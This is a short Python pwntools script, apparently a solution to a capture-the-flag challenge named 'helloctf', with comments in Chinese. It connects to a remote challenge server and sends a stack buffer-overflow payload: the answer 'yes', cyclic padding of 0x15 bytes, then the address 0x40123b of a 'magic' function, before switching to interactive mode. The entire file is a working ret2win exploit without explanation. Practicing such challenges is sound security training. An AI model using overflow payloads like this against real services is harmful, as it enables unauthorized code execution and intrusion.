#!/usr/bin/python3
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64' #設定目標機的資訊

# p = process('share/helloctf') #檔名
p = remote('140.115.59.7', 10000)

pause()
magic = 0x40123b

payload = flat(
        b"yes",
        cyclic(0x15),
        magic
)

p.sendlineafter(b"Do you like VTuber?\n", payload)

p.interactive()
p.close()